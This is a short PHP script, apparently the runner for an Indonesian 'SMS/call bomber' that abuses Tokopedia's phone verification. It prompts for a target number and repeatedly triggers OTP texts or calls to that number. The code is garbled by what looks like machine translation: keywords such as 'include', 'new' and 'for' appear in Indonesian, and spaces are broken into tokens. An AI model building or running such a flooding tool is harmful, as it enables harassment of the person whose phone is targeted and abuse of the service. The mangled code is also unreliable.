<? php
termasuk  ' bomtokped.php ' ;
/ *
    https://github.com/nee48/BomTelpSmsTokped
    Dibuat oleh Dion Shincan
    Dimodifikasi oleh ま や ち ゃ ん
* /
$ init  =  Bom baru  ();
// Eksekusi Panggilan / Sms Boomber (Batas 20x / Jam)
echo  " Nomor Target (tanpa 62/0) \ n Input: " ;
$ a  =  trim ( fgets ( STDIN ));
echo  " Ketik 1 untuk sms, 2 untuk panggilan \ n Input: " ;
$ b  =  trim ( fgets ( STDIN ));
$ init -> type  =  " $ b " ;
$ init -> no  =  " $ a " ;
if ( $ init -> type  ==  1 ) {
	untuk ( $ i = 0 ; $ i  <  2 ; $ i ++ ) {
	    $ init -> Verif ( $ init -> no , $ init -> type );
	}
} elseif ( $ init -> type  ==  2 ) {
	 $ init -> Verif ( $ init -> no , $ init -> type );
}
